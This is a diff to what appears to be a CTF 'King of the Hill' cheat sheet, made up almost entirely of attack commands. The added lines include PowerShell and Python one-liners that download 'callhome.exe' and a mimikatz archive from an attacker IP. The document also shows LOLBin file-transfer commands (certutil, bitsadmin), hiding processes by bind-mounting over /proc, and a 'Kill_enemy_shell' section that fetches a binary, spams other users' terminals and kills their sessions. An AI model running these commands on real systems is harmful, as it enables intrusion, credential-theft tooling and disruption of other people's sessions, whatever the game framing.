@@ -40,6 +40,9 @@ certutil -urlcache -split -f http://10.10.10.10:8000/namefile.txt C:\Users\Publi
 powershell -c wget "http://10.10.10.10:8000/namefile.txt" -OutFile "C:\Windows\Temp\namefile.txt"
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10:8000/namefile.txt' -OutFile 'C:\Windows\Temp\namefile.txt'"
 bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10:8000/namefile.txt C:\Users\temp\namefile.txt
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10:8000/callhome.exe','callhome.exe')"
+
+c:\Python27\python.exe -c "import urllib; print urllib.urlopen('http://10.10.10.10:8000/mimikatz_trunk.zip').read()" > mimikatz_trunk.zip
 ```
 # Enumeration ✅📚
 ## Nmap_Enumeration ✅
@@ -255,6 +258,16 @@ lessecho "solcoteh" > /root/king.txt
 set -o noclobber /root/king.txt
 sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null
 ```
+### Not_Be-king ✅
+```bash
+chattr -ia /root
+chattr -ia /root/king.txt
+
+set +o noclobber /root/king.txt
+
+sudo umount -l /root
+sudo umount -l /root/king.txt
+```
 ### mount-trick ✅
 ```bash
 sudo lessecho solcoteh > /root/king.txt
@@ -272,24 +285,17 @@ mount -o bind /tmp /proc/your-PID-here (Hide your PTS)
 
 mkdir /dev/shm/.hidden && mount -o bind /dev/shm/.hidden /proc/pid
 ```
-### Not_Be-king ✅
-```bash
-chattr -ia /root
-chattr -ia /root/king.txt
-
-set +o noclobber /root/king.txt
-
-sudo umount -l /root
-sudo umount -l /root/king.txt
-```
-### Command_useful ✅
+### Kill_enemy_shell ✅
 ```bash
 wget http://yourip/nyancat
 chmod +x nyancat 
-./nyancat > /dev/$pts
+./nyancat > /dev/$pts #replace $pts with pts of enemy
 
 tty (If you're looking for your pts id/number)
 pkill -9 -t pts/<number>
+
+ps aux
+kill -9 $PID
 
 cat /dev/urandom > /dev/pts/# ( sending spam for another user )
 cat /dev/urandom > $dir 2>/dev/null
@@ -302,6 +308,9 @@ cat /etc/shells (show available shells)
 ### Tools_Useful
 [pspy](https://github.com/DominicBreuker/pspy)
 [chisel](https://github.com/jpillora/chisel)
+[nyancat](https://github.com/klange/nyancat)
+[linpeas.sh](https://github.com/peass-ng/PEASS-ng)
+[LinEnum.sh](https://github.com/rebootuser/LinEnum)
 ### disable_rootkit
 ```bash
 echo 1 > /proc/sys/kernel/modules_disabled
